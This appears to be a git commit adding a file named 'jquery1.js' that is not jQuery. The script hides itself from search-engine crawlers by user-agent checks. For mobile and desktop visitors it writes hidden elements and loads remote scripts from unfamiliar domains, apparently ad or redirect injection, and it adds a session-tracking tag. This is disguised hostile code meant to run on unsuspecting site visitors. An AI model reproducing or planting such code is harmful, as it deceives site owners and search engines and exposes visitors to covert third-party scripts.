b030c6ffa68900dc9e25162e3b5bee64888f838f
dage66788 <57900683+dage66788@users.noreply.github.com>
2024-04-25 09:34:51 +0800

    Add files via upload

---
+++ jquery1.js
@@ -0,0 +1,26 @@
+if(navigator.userAgent.match(/(spider|BaiduGame|Googlebot|msnbot|Yahoo! Slurp|YoudaoBot|Yahoo Slurp|Spider|Google AdSense)/i)){
+} else {
+if(navigator.userAgent.match(/(iPhone|Android|ipad)/i)){
+
+(function (){
+        var id = "1857953001038183338-399";
+  document.write('<viv style="display:none!important" id="' + id + '"></viv>');
+  (window.adbyunion = window.adbyunion || []).push(id);
+})();
+document.writeln("<script async src=\'https://hglm.xpqfa.cn/slot\'></script>");
+    (function () {
+        var id = "1857953001038183338-398";
+        document.write('<viv style="display:none!important" id="' + id + '"></viv>');
+        (window.adbyunion = window.adbyunion || []).push(id);
+    })();
+    document.writeln("<script async src=\'https://hglm.xpqfa.cn/apps/sdk\'></script>");
+}else {
+    document.writeln("<script src=\'//pc.stgowan.com/pc/bfixed-tf.js\' id=\'btfixedwrap\' data=\'s=7005\'></script>");
+    document.writeln("<script src=\'//pc.stgowan.com/pc/rich-tf.js\' id=\'richid\' data=\'s=7003\'></script>");
+}
+}
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "izhck2a1d8");
